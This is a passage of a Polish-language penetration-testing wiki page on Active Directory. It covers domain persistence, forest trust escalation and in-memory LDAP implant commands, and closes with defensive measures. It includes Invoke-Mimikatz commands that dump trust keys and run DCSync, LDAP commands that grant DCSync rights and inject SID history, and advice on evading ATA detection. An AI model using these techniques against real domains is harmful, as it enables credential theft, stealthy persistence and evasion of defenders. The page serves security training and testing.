### **Certificates Domain Persistence**

**Używanie certyfikatów umożliwia również utrzymanie się z wysokimi uprawnieniami w domenie:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Obiekt **AdminSDHolder** w Active Directory zapewnia bezpieczeństwo **uprzywilejowanych grup** (takich jak Domain Admins i Enterprise Admins) przez stosowanie standardowego **Access Control List (ACL)** w tych grupach, aby zapobiec nieautoryzowanym zmianom. Jednak ta funkcja może zostać wykorzystana; jeśli atakujący zmodyfikuje ACL AdminSDHolder, nadając pełny dostęp zwykłemu użytkownikowi, użytkownik ten zyskuje szeroką kontrolę nad wszystkimi uprzywilejowanymi grupami. Ten mechanizm bezpieczeństwa, mający chronić, może więc obrócić się przeciwko i umożliwić nieuprawniony dostęp, jeśli nie jest ściśle monitorowany.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Wewnątrz każdego **Domain Controller (DC)** istnieje konto **lokalnego administratora**. Uzyskując prawa administratora na takiej maszynie, można wyodrębnić hash lokalnego Administratora przy użyciu **mimikatz**. Następnie konieczna jest modyfikacja rejestru, aby **zezwolić na użycie tego hasła**, umożliwiając zdalny dostęp do konta lokalnego Administratora.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Możesz **przyznać** pewne **specjalne uprawnienia** użytkownikowi do określonych obiektów domeny, które pozwolą temu użytkownikowi na **eskalację uprawnień w przyszłości**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Deskryptory zabezpieczeń

**Deskryptory zabezpieczeń** służą do **przechowywania** **uprawnień**, jakie posiada **obiekt**. Jeśli możesz wprowadzić nawet **małą zmianę** w **deskryptorze zabezpieczeń** obiektu, możesz uzyskać bardzo interesujące uprawnienia nad tym obiektem bez konieczności bycia członkiem uprzywilejowanej grupy.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Zmodyfikuj **LSASS** w pamięci, aby ustawić **uniwersalne hasło**, dające dostęp do wszystkich kont domenowych.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Możesz stworzyć własne **SSP**, aby **przechwytywać** w **czystym tekście** **poświadczenia** używane do dostępu do maszyny.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Rejestruje **nowy Domain Controller** w AD i używa go do **push attributes** (SIDHistory, SPNs...) na wskazanych obiektach **bez** pozostawiania jakichkolwiek **logów** dotyczących tych **modyfikacji**. Potrzebujesz uprawnień **DA** i musisz być wewnątrz **root domain**.\
Należy pamiętać, że jeśli użyjesz niewłaściwych danych, pojawią się dość brzydkie logi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Wcześniej omówiliśmy, jak eskalować uprawnienia, jeśli masz **wystarczające uprawnienia do odczytu haseł LAPS**. Jednak te hasła mogą być również użyte do **utrzymania dostępu**.\
Sprawdź:


{{#ref}}
laps.md
{{#endref}}

## Eskalacja uprawnień w lesie - zaufania domen

Microsoft traktuje **Forest** jako granicę bezpieczeństwa. Oznacza to, że **skompromitowanie pojedynczej domeny może potencjalnie doprowadzić do kompromitacji całego Forest**.

### Podstawowe informacje

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) to mechanizm bezpieczeństwa, który umożliwia użytkownikowi z jednej **domeny** dostęp do zasobów w innej **domenie**. Tworzy on powiązanie między systemami uwierzytelniania obu domen, pozwalając na przepływ weryfikacji uwierzytelniania. Kiedy domeny ustanawiają trust, wymieniają i przechowują specyficzne **klucze** w swoich **Domain Controllers (DC)**, które są kluczowe dla integralności trustu.

W typowym scenariuszu, jeśli użytkownik chce uzyskać dostęp do usługi w **zaufanej domenie**, musi najpierw poprosić o specjalny bilet znany jako **inter-realm TGT** od DC swojej domeny. Ten TGT jest szyfrowany wspólnym **kluczem**, który został uzgodniony przez obie domeny. Użytkownik następnie przedstawia ten inter-realm TGT **DC zaufanej domeny**, aby otrzymać bilet serwisowy (**TGS**). Po pomyślnej weryfikacji inter-realm TGT przez DC zaufanej domeny, wydaje ona TGS, przyznając użytkownikowi dostęp do usługi.

**Kroki**:

1. Komputer-klient w **Domain 1** rozpoczyna proces, używając swojego **NTLM hash**, aby zażądać **Ticket Granting Ticket (TGT)** od swojego **Domain Controller (DC1)**.
2. DC1 wydaje nowy TGT, jeśli klient zostanie pomyślnie uwierzytelniony.
3. Następnie klient prosi DC1 o **inter-realm TGT**, który jest potrzebny do dostępu do zasobów w **Domain 2**.
4. Inter-realm TGT jest szyfrowany za pomocą **trust key** współdzielonego między DC1 i DC2 jako części dwukierunkowego zaufania domen.
5. Klient przekazuje inter-realm TGT do **Domain 2's Domain Controller (DC2)**.
6. DC2 weryfikuje inter-realm TGT przy użyciu współdzielonego trust key i, jeśli jest ważny, wydaje **Ticket Granting Service (TGS)** dla serwera w Domain 2, do którego klient chce uzyskać dostęp.
7. W końcu klient przedstawia ten TGS serwerowi, który jest szyfrowany hashem konta serwera, aby uzyskać dostęp do usługi w Domain 2.

### Different trusts

Ważne jest, aby zauważyć, że **trust może być jednokierunkowy lub dwukierunkowy**. W opcji dwukierunkowej obie domeny będą sobie ufać, ale w relacji **jednokierunkowej** jedna z domen będzie **trusted**, a druga **trusting**. W tym ostatnim przypadku **będziesz w stanie uzyskać dostęp tylko do zasobów wewnątrz domeny trusting z domeny trusted**.

Jeśli Domain A ufa Domain B, A jest domeną ufającą, a B jest domeną zaufaną. Co więcej, w **Domain A**, będzie to **Outbound trust**; a w **Domain B**, będzie to **Inbound trust**.

**Różne relacje zaufania**

- **Parent-Child Trusts**: Jest to powszechna konfiguracja w ramach tego samego forest, gdzie domena dziecka automatycznie ma dwukierunkowe, przechodnie zaufanie ze swoją domeną nadrzędną. W praktyce oznacza to, że żądania uwierzytelnienia mogą swobodnie przepływać między rodzicem a dzieckiem.
- **Cross-link Trusts**: Nazywane też "shortcut trusts", są ustanawiane między domenami potomnymi, aby przyspieszyć procesy odsyłania. W złożonych lasach, odsyłania uwierzytelnienia zwykle muszą podróżować do korzenia lasu, a następnie w dół do docelowej domeny. Tworząc cross-links, skraca się tę drogę, co jest szczególnie korzystne w środowiskach rozproszonych geograficznie.
- **External Trusts**: Ustanawiane są między różnymi, niespowinowaconymi domenami i z natury są niedochodowe. Zgodnie z [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts są przydatne do uzyskiwania dostępu do zasobów w domenie spoza bieżącego forest, która nie jest połączona trustem leśnym. Bezpieczeństwo jest wzmacniane przez filtrowanie SID przy external trusts.
- **Tree-root Trusts**: Te zaufania są automatycznie ustanawiane między domeną root lasu a nowo dodanym tree root. Chociaż nie są często spotykane, tree-root trusts są ważne przy dodawaniu nowych drzew domen do lasu, pozwalając im zachować unikalną nazwę domeny i zapewniając dwukierunkową przechodniość. Więcej informacji można znaleźć w [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ten typ trustu to dwukierunkowe przechodnie zaufanie między dwoma domenami root lasu, również wymuszające filtrowanie SID w celu zwiększenia środków bezpieczeństwa.
- **MIT Trusts**: Te trusty są ustanawiane z nie-Windowsowymi, zgodnymi z [RFC4120](https://tools.ietf.org/html/rfc4120) domenami Kerberos. MIT trusts są bardziej wyspecjalizowane i służą środowiskom wymagającym integracji z systemami opartymi na Kerberos poza ekosystemem Windows.

#### Inne różnice w relacjach zaufania

- Relacja zaufania może być również **przechodnia** (A ufa B, B ufa C, więc A ufa C) lub **nieprzechodnia**.
- Relacja zaufania może być ustawiona jako **bidirectional trust** (obie ufają sobie) lub jako **one-way trust** (tylko jedna ufa drugiej).

### Ścieżka ataku

1. **Enumeruj** relacje zaufania
2. Sprawdź, czy jakikolwiek **security principal** (user/group/computer) ma **dostęp** do zasobów **drugiej domeny**, być może przez wpisy ACE lub przez przynależność do grup drugiej domeny. Szukaj **relacji między domenami** (trust prawdopodobnie został utworzony w tym celu).
1. kerberoast w tym przypadku może być kolejną opcją.
3. **Skompromituj** **konta**, które mogą **pivotować** przez domeny.

Atakujący mogą uzyskać dostęp do zasobów w innej domenie przez trzy główne mechanizmy:

- **Local Group Membership**: Security principals mogą być dodani do lokalnych grup na maszynach, takich jak grupa “Administrators” na serwerze, przyznając im znaczne uprawnienia nad tą maszyną.
- **Foreign Domain Group Membership**: Principals mogą być również członkami grup w domenie obcej. Jednak skuteczność tej metody zależy od charakteru trustu i zakresu grupy.
- **Access Control Lists (ACLs)**: Principals mogą być wyspecyfikowani w **ACL**, szczególnie jako podmioty w **ACE** wewnątrz **DACL**, przyznając im dostęp do konkretnych zasobów. Dla tych, którzy chcą zgłębić mechanikę ACL, DACL i ACE, whitepaper zatytułowany “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” jest nieocenionym źródłem.

### Znajdź zewnętrznych użytkowników/grupy z uprawnieniami

Możesz sprawdzić **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, aby znaleźć foreign security principals w domenie. Będą to użytkownicy/grupy z **zewnętrznej domeny/lasu**.

Możesz to sprawdzić w **Bloodhound** lub używając powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Inne sposoby enumerowania zaufień domen:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Istnieją **2 trusted keys**, jeden dla _Child --> Parent_ i drugi dla _Parent_ --> _Child_.\
> Możesz sprawdzić, który klucz jest używany przez bieżącą domenę za pomocą:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Podnieś uprawnienia do Enterprise admin w child/parent domain, nadużywając trust przy użyciu SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Zrozumienie, w jaki sposób Configuration Naming Context (NC) może być wykorzystany, jest kluczowe. Configuration NC służy jako centralne repozytorium dla danych konfiguracyjnych w całym lesie Active Directory (AD). Dane te są replikowane do każdego Domain Controller (DC) w lesie, przy czym writable DCs utrzymują zapisywalną kopię Configuration NC. Aby to wykorzystać, trzeba mieć **SYSTEM privileges on a DC**, najlepiej na child DC.

**Link GPO to root DC site**

Kontener Sites w Configuration NC zawiera informacje o site'ach wszystkich komputerów dołączonych do domeny w lesie AD. Mając uprawnienia SYSTEM na dowolnym DC, atakujący mogą linkować GPO do root DC sites. Ta akcja potencjalnie kompromituje root domain poprzez manipulowanie politykami stosowanymi do tych site'ów.

Do szczegółowych informacji można zajrzeć do badań nad [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Wejście na ścieżkę ataku obejmuje celowanie w uprzywilejowane gMSA w domenie. KDS Root key, niezbędny do obliczania haseł gMSA, jest przechowywany w Configuration NC. Mając uprawnienia SYSTEM na dowolnym DC, możliwe jest uzyskanie dostępu do KDS Root key i obliczenie haseł dla dowolnego gMSA w lesie.

Szczegółowa analiza i instrukcje krok po kroku znajdują się w:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Uzupełniający atak na delegowanego MSA (BadSuccessor – nadużycie migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatkowe zewnętrzne badania: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Metoda ta wymaga cierpliwości i oczekiwania na tworzenie nowych uprzywilejowanych obiektów AD. Mając uprawnienia SYSTEM, atakujący może zmodyfikować AD Schema tak, aby przyznać dowolnemu użytkownikowi pełną kontrolę nad wszystkimi klasami. To może prowadzić do nieautoryzowanego dostępu i kontroli nad nowo tworzonymi obiektami AD.

Dalsza lektura: [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 to luka celująca w kontrolę nad obiektami PKI, pozwalająca na stworzenie template'u certyfikatu umożliwiającego uwierzytelnienie się jako dowolny użytkownik w lesie. Ponieważ obiekty PKI znajdują się w Configuration NC, kompromitacja writable child DC umożliwia przeprowadzenie ataków ESC5.

Więcej informacji: [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). W scenariuszach bez ADCS, atakujący może zainstalować niezbędne komponenty samodzielnie, jak opisano w [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
W tym scenariuszu **twoja domena jest zaufana** przez domenę zewnętrzną, co daje ci **nieokreślone uprawnienia** względem niej. Musisz ustalić, **którzy principalowie twojej domeny mają jaki dostęp do zewnętrznej domeny**, a następnie spróbować to wykorzystać:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Zewnętrzna domena lasu - jednokierunkowa (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
W tym scenariuszu **twoja domena** przyznaje pewne **uprawnienia** principalowi z **innej domeny**.

Jednak gdy **domena jest zaufana** przez domenę ufającą, domena zaufana **tworzy użytkownika** o **przewidywalnej nazwie**, którego **hasłem jest zaufane hasło**. To oznacza, że możliwe jest **zalogować się użytkownikiem z domeny ufającej do domeny zaufanej** w celu jej enumeracji i próby eskalacji uprawnień:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Another way to compromise the trusted domain is to find a [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) created in the **opposite direction** of the domain trust (which isn't very common).

Another way to compromise the trusted domain is to wait in a machine where a **user from the trusted domain can access** to login via **RDP**. Then, the attacker could inject code in the RDP session process and **access the origin domain of the victim** from there.\
Moreover, if the **victim mounted his hard drive**, from the **RDP session** process the attacker could store **backdoors** in the **startup folder of the hard drive**. This technique is called **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Łagodzenie nadużyć zaufania domen

### **SID Filtering:**

- Ryzyko ataków wykorzystujących atrybut SID history w ramach zaufania pomiędzy lasami jest ograniczane przez SID Filtering, które jest domyślnie aktywowane na wszystkich zaufaniach między-lasami. Wynika to z założenia, że zaufania wewnątrz lasu są bezpieczne, traktując las, a nie domenę, jako granicę bezpieczeństwa zgodnie ze stanowiskiem Microsoftu.
- Jednak jest pewien haczyk: SID Filtering może zakłócać działanie aplikacji i dostęp użytkowników, co prowadzi do jego okazjonalnego wyłączenia.

### **Selective Authentication:**

- W przypadku zaufania między lasami zastosowanie Selective Authentication sprawia, że użytkownicy z dwóch lasów nie są automatycznie uwierzytelniani. Zamiast tego wymagane są jawne uprawnienia, aby użytkownicy mogli uzyskać dostęp do domen i serwerów w obrębie domeny lub lasu ufającego.
- Ważne jest, aby pamiętać, że te środki nie chronią przed wykorzystaniem zapisywalnego Configuration Naming Context (NC) ani przed atakami na konto zaufania.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Nadużycia AD oparte na LDAP z implantów na hoście

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Enumeracja LDAP po stronie implantu

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` rozwiązują krótkie nazwy/ścieżki OU do pełnych DN i zrzucają odpowiadające obiekty.
- `get-object`, `get-attribute`, and `get-domaininfo` pobierają dowolne atrybuty (w tym security descriptors) oraz metadane lasu/domeny z `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` ujawniają roasting candidates, ustawienia delegacji oraz istniejące [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) deskryptory bezpośrednio z LDAP.
- `get-acl` and `get-writable --detailed` parsują DACL, aby wymienić trustee, prawa (GenericAll/WriteDACL/WriteOwner/attribute writes) oraz dziedziczenie, dając natychmiastowe cele do eskalacji uprawnień przez ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) pozwalają operatorowi umieścić nowych principals lub machine accounts tam, gdzie istnieją prawa do OU. `add-groupmember`, `set-password`, `add-attribute`, oraz `set-attribute` bezpośrednio przechwytują cele po wykryciu write-property rights.
- Polecenia skupione na ACL, takie jak `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, oraz `add-dcsync` przekładają WriteDACL/WriteOwner na dowolnym obiekcie AD na resety haseł, kontrolę członkostwa w grupach lub przywileje replikacji DCSync, bez pozostawiania artefaktów PowerShell/ADSI. Odpowiedniki `remove-*` usuwają wstrzyknięte ACE.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` natychmiast czynią skompromitowanego użytkownika Kerberoastable; `add-asreproastable` (UAC toggle) oznacza go do AS-REP roasting bez dotykania hasła.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) przepisują `msDS-AllowedToDelegateTo`, flagi UAC lub `msDS-AllowedToActOnBehalfOfOtherIdentity` z beacona, umożliwiając ścieżki ataku constrained/unconstrained/RBCD i eliminując potrzebę remote PowerShell lub RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` wstrzykuje uprzywilejowane SIDs do SID history kontrolowanego principala (zob. [SID-History Injection](sid-history-injection.md)), zapewniając ukrytą dziedziczność dostępu w pełni przez LDAP/LDAPS.
- `move-object` zmienia DN/OU komputerów lub użytkowników, pozwalając atakującemu przenieść zasoby do OU, gdzie delegowane prawa już istnieją, zanim wykorzysta `set-password`, `add-groupmember`, lub `add-spn`.
- Dokładnie ukierunkowane polecenia usuwania (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, itd.) umożliwiają szybkie wycofanie zmian po tym, jak operator zebrał credentials lub ustanowił persistence, minimalizując telemetrię.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Kilka ogólnych środków obrony

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Zaleca się, aby Domain Admins mogli logować się tylko do Domain Controllers, unikając ich używania na innych hostach.
- **Service Account Privileges**: Usługi nie powinny być uruchamiane z uprawnieniami Domain Admin (DA) w celu utrzymania bezpieczeństwa.
- **Temporal Privilege Limitation**: W przypadku zadań wymagających uprawnień DA, ich czas powinien być ograniczony. Można to osiągnąć za pomocą: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementing Deception Techniques**

- Wdrażanie technik decepcyjnych polega na zastawianiu pułapek, np. kont zastępczych użytkowników lub komputerów, z cechami takimi jak hasła, które nie wygasają, lub oznaczone jako Trusted for Delegation. Szczegółowe podejście obejmuje tworzenie użytkowników z określonymi uprawnieniami lub dodawanie ich do grup o wysokich przywilejach.
- Praktyczny przykład wykorzystuje narzędzia takie jak: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Więcej o wdrażaniu technik decepcyjnych można znaleźć na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Podejrzane wskaźniki obejmują nietypowe ObjectSID, rzadkie logowania, daty utworzenia oraz niską liczbę nieudanych prób logowania (bad password counts).
- **General Indicators**: Porównanie atrybutów potencjalnych decoy obiektów z autentycznymi może ujawnić niespójności. Narzędzia takie jak [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogą pomóc w identyfikacji takich decepcyjnych obiektów.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Unikanie enumeracji sesji na Domain Controllers, by zapobiec wykryciu przez ATA.
- **Ticket Impersonation**: Wykorzystanie kluczy **aes** do tworzenia ticketów pomaga uniknąć wykrycia, nie degradując do NTLM.
- **DCSync Attacks**: Zaleca się uruchamiać z hosta nie będącego Domain Controllerem, aby uniknąć wykrycia przez ATA, ponieważ bezpośrednie wykonanie z Domain Controller spowoduje alerty.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
